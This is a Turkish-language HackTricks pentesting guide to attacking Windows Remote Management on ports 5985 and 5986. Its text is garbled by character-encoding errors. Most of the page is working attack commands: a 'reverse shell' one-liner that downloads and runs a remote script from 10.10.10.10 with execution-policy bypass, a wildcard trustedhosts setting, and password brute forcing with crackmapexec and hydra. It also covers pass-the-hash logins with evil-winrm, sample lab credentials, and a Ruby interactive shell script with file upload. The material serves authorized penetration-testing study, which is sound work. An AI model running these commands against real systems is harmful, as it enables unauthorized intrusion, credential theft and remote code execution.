# 5985,5986 - Pentesting WinRM

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden bize katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## WinRM

[Windows Remote Management (WinRM)](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx), **Microsoft tarafÄ±ndan** vurgulanan bir **protokoldÃ¼r** ve **Windows sistemlerinin uzaktan yÃ¶netimini** HTTP(S) Ã¼zerinden saÄŸlar, bu sÃ¼reÃ§te SOAP kullanÄ±r. Temelde WMI tarafÄ±ndan desteklenir ve WMI iÅŸlemleri iÃ§in HTTP tabanlÄ± bir arayÃ¼z olarak kendini sunar.

Bir makinede WinRM'in varlÄ±ÄŸÄ±, PowerShell aracÄ±lÄ±ÄŸÄ±yla basit uzaktan yÃ¶netim saÄŸlar; bu, diÄŸer iÅŸletim sistemleri iÃ§in SSH'nin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±na benzer. WinRM'in Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in belirli portlarÄ±n aÃ§Ä±lÄ±p aÃ§Ä±lmadÄ±ÄŸÄ±nÄ± kontrol etmek Ã¶nerilir:

* **5985/tcp (HTTP)**
* **5986/tcp (HTTPS)**

YukarÄ±daki listeden aÃ§Ä±k bir port, WinRM'in kurulu olduÄŸunu gÃ¶sterir ve bÃ¶ylece uzaktan oturum baÅŸlatma giriÅŸimlerine izin verir.

### **WinRM Oturumu BaÅŸlatma**

PowerShell'i WinRM iÃ§in yapÄ±landÄ±rmak Ã¼zere, Microsoft'un `Enable-PSRemoting` cmdlet'i devreye girer ve bilgisayarÄ± uzaktan PowerShell komutlarÄ±nÄ± kabul edecek ÅŸekilde ayarlar. YÃ¼kseltilmiÅŸ PowerShell eriÅŸimi ile, bu iÅŸlevselliÄŸi etkinleÅŸtirmek ve herhangi bir hostu gÃ¼venilir olarak belirlemek iÃ§in aÅŸaÄŸÄ±daki komutlar Ã§alÄ±ÅŸtÄ±rÄ±labilir:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
Bu yaklaÅŸÄ±m, `trustedhosts` yapÄ±landÄ±rmasÄ±na bir joker karakter eklemeyi iÃ§erir; bu adÄ±m, sonuÃ§larÄ± nedeniyle dikkatli bir deÄŸerlendirme gerektirir. AyrÄ±ca, saldÄ±rganÄ±n makinesinde aÄŸ tÃ¼rÃ¼nÃ¼n "Public"ten "Work"e deÄŸiÅŸtirilmesinin gerekli olabileceÄŸi de belirtilmiÅŸtir.

AyrÄ±ca, WinRM `wmic` komutu kullanÄ±larak **uzaktan etkinleÅŸtirilebilir**, aÅŸaÄŸÄ±daki gibi gÃ¶sterilmiÅŸtir:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
Bu yÃ¶ntem, uzaktan WinRM kurulumu yapmayÄ± saÄŸlar ve Windows makinelerini uzaktan yÃ¶netme esnekliÄŸini artÄ±rÄ±r.

### YapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± test et

SaldÄ±rÄ± makinenizin kurulumunu doÄŸrulamak iÃ§in, hedefin WinRM'nin dÃ¼zgÃ¼n yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Test-WSMan` komutu kullanÄ±lÄ±r. Bu komutu Ã§alÄ±ÅŸtÄ±rarak, baÅŸarÄ±lÄ± bir yapÄ±landÄ±rmayÄ± gÃ¶steren protokol versiyonu ve wsmid ile ilgili ayrÄ±ntÄ±larÄ± almayÄ± beklemelisiniz. AÅŸaÄŸÄ±da, yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedef ile yapÄ±landÄ±rÄ±lmamÄ±ÅŸ bir hedef iÃ§in beklenen Ã§Ä±ktÄ±yÄ± gÃ¶steren Ã¶rnekler bulunmaktadÄ±r:

* **DoÄŸru** yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir hedef iÃ§in, Ã§Ä±ktÄ± aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼necektir:
```bash
Test-WSMan <target-ip>
```
YanÄ±t, protokol sÃ¼rÃ¼mÃ¼ ve wsmid hakkÄ±nda bilgi iÃ§ermelidir; bu, WinRM'nin doÄŸru bir ÅŸekilde yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir.

![](<../.gitbook/assets/image (582).png>)

* Aksine, WinRM iÃ§in **yapÄ±landÄ±rÄ±lmamÄ±ÅŸ** bir hedef iÃ§in, bÃ¶yle ayrÄ±ntÄ±lÄ± bir bilgi elde edilemeyecek ve uygun bir WinRM yapÄ±landÄ±rmasÄ±nÄ±n yokluÄŸunu vurgulayacaktÄ±r.

![](<../.gitbook/assets/image (458).png>)

### Bir komut Ã§alÄ±ÅŸtÄ±r

Hedef makinede `ipconfig` komutunu uzaktan Ã§alÄ±ÅŸtÄ±rmak ve Ã§Ä±ktÄ±sÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (151).png>)

AyrÄ±ca, mevcut PS konsolunuzun bir komutunu _**Invoke-Command**_ aracÄ±lÄ±ÄŸÄ±yla **Ã§alÄ±ÅŸtÄ±rabilirsiniz**. Diyelim ki yerel olarak _**enumeration**_ adÄ±nda bir fonksiyonunuz var ve bunu **uzaktaki bir bilgisayarda Ã§alÄ±ÅŸtÄ±rmak** istiyorsunuz, bunu yapabilirsiniz:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### Bir Script Ã‡alÄ±ÅŸtÄ±rma
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### Ters kabuk al
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PS oturumu al

EtkileÅŸimli bir PowerShell kabuÄŸu almak iÃ§in `Enter-PSSession` kullanÄ±n:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (1009).png>)

**Oturum, "kurban" iÃ§inde yeni bir sÃ¼reÃ§te (wsmprovhost) Ã§alÄ±ÅŸacaktÄ±r.**

### **WinRM'yi AÃ§maya Zorlama**

PS Remoting ve WinRM kullanmak istiyorsanÄ±z ancak bilgisayar yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, bunu ÅŸu ÅŸekilde etkinleÅŸtirebilirsiniz:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### OturumlarÄ± Kaydetme ve Geri YÃ¼kleme

Bu **Ã§alÄ±ÅŸmayacak** eÄŸer **dil** uzak bilgisayarda **kÄ±sÄ±tlÄ±ysa**.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
Bu oturumlar iÃ§inde _Invoke-Command_ kullanarak PS betikleri yÃ¼kleyebilirsiniz.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### Hatalar

AÅŸaÄŸÄ±daki hatayÄ± bulursanÄ±z:

`enter-pssession : Uzak sunucu 10.10.10.175 ile baÄŸlantÄ± kurulamadÄ±, aÅŸaÄŸÄ±daki hata mesajÄ± ile : WinRM istemcisi isteÄŸi iÅŸleyemiyor. Kimlik doÄŸrulama ÅŸemasÄ± Kerberos'tan farklÄ±ysa veya istemci bilgisayarÄ± bir domaine katÄ±lmamÄ±ÅŸsa, HTTPS taÅŸÄ±ma kullanÄ±lmalÄ± veya hedef makine TrustedHosts yapÄ±landÄ±rma ayarÄ±na eklenmelidir. TrustedHosts'u yapÄ±landÄ±rmak iÃ§in winrm.cmd kullanÄ±n. TrustedHosts listesindeki bilgisayarlarÄ±n kimlik doÄŸrulamasÄ±nÄ±n yapÄ±lmamÄ±ÅŸ olabileceÄŸini unutmayÄ±n. Bununla ilgili daha fazla bilgi almak iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rabilirsiniz: winrm help config. Daha fazla bilgi iÃ§in, about_Remote_Troubleshooting YardÄ±m konusuna bakÄ±n.`

Ä°stemci Ã¼zerindeki deneme (bilgi [buradan](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Insights**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**Real-Time Hack News**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Latest Announcements**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

BugÃ¼n [**Discord**](https://discord.com/invite/N3FrSbmwdy) Ã¼zerinden bize katÄ±lÄ±n ve en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Linux'ta WinRM baÄŸlantÄ±sÄ±

### Brute Force

Dikkatli olun, winrm'yi brute-force yapmak kullanÄ±cÄ±larÄ± engelleyebilir.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrm KullanÄ±mÄ±
```ruby
gem install evil-winrm
```
**belgeleri** github'dan okuyun: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
Evil-winrm kullanarak bir **IPv6 adresine** baÄŸlanmak iÃ§in _**/etc/hosts**_ dosyasÄ±na bir giriÅŸ oluÅŸturun ve **alan adÄ±nÄ±** IPv6 adresine ayarlayÄ±n, ardÄ±ndan o alana baÄŸlanÄ±n.

### Hash'i evil-winrm ile geÃ§in
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (680).png>)

### PS-docker makinesi kullanma
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### Ruby script kullanma

**Kod buradan alÄ±nmÄ±ÅŸtÄ±r:** [**https://alamot.github.io/winrm\_shell/**](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Referanslar

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Otomatik Komutlar
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ± ve zorluklarÄ±na dalan iÃ§eriklerle etkileÅŸimde bulunun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
GerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle hÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nda gÃ¼ncel kalÄ±n

**Son Duyurular**\
Yeni baÅŸlayan bug bounty'ler ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**BugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmak iÃ§in** [**Discord**](https://discord.com/invite/N3FrSbmwdy) 'a katÄ±lÄ±n!

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
